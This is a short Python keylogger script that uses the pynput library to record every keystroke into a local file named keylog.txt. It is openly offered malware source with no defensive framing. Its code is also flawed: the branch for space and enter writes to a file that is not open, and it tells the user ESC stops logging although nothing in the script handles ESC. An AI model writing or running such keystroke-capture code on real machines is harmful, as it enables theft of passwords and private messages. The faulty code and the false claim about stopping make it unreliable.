import pynput.keyboard
import os

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        if key == key.space:
            f.write(" ")
        elif key == key.enter:
            f.write("\n")
        else:
            with open(log_file, "a") as f:
                f.write("[" + str(key) + "]")

def main():
    # Ensure the log file exists
    if not os.path.isfile(log_file):
        open(log_file, "w").close()

    listener = pynput.keyboard.Listener(on_press=on_press)
    print("🔑 Keylogger started... Logging keystrokes to:", log_file)
    print("⚠️ Press ESC to stop.")
    listener.start()
    listener.join()  # Keep the script running until stopped

if __name__ == "__main__":
    main()
